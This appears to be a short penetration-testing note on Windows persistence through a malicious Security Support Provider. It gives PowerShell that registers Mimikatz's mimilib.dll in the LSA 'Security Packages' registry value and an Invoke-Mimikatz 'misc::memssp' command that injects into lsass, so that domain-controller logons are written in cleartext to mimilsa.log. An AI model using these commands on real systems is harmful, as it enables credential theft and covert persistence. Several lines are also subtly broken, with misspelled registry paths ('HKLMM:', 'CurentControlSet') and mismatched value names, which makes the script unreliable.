---
tags:
  - persistence
cssclasses: []
---
- A Security Support Provider is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are:
	- NTLM
	- Kerberos
	- WDigest
	- CredSSP
- Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server.
- We can use either of the ways:
	- Drop the mimilib.dll to system32 and add mimilib to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`

```powershell title:"Modify registry to add mimilib.dll as a Security Support Provider"
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'SecurityPackages'
$packages += "mimilib"
Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
Set-ItemProperty HKLMM:\SYSTEM\CurentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```

```powershell title:"Inject into lsass (Not super stable with Server 2019 and Server 2022 but still usable)"
Invoke-MimiKatz -Command '"misc::memssp"'
```

- All local logons on the DC are logged to `C:\Windows\System32\mimilsa.log`